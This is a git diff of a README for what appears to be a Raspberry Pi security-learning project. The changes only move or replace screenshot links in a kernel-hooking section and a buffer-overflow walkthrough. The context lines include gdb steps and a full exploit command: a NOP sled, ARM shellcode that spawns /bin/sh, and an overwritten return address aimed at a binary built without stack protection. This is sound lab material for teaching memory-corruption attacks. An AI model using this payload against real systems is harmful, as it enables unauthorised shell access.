@@ -54,7 +54,7 @@ kss@ubuntu:~/HackRPi$ sudo umount /mnt/fs
 pi@raspberrypi:~/Hook$ sudo insmod hooker.ko
 ```
 - **Result**  
-![image](https://user-images.githubusercontent.com/20378368/107609218-a0d7a480-6c81-11eb-9e77-83a704dfe2c9.png)  
+![image](https://user-images.githubusercontent.com/20378368/107657527-97bdf600-6cc8-11eb-8165-81f5bb721fc0.png)  
 
 ## Buffer Overflow 🐱‍💻
 - **Step 1**: Compile without stack protection  
@@ -77,11 +77,11 @@ pi@korkeep:~/BOF $ gdb -q BOF
 (gdb) b *0x00010530
 ```
 - **Step 5**: Analyze address state  
-![image](https://user-images.githubusercontent.com/20378368/107655183-a86d6c80-6cc6-11eb-9a09-7223b26fdd69.png)  
 ```
 (gdb) x/100x $sp-200
 ```
 - **Step 6**: Buffer overflow using NOP sled  
+![image](https://user-images.githubusercontent.com/20378368/107655183-a86d6c80-6cc6-11eb-9a09-7223b26fdd69.png)  
 ```
 // Target address: 0x7efff570
 (gdb) run $(python -c 'print "\x01\x10\xa0\xe1"*17+"\x01\x30\x8f\xe2\x13\xff\x2f\xe1\x03\xa0\x52\x40\xc2\x71\x05\xb4\x69\x46\x0b\x27\x01\xdf\x2d\x1c\x2f\x62\x69\x6e\x2f\x73\x68\x58"+"AAAA"+"\x70\xf5\xff\x7e"')
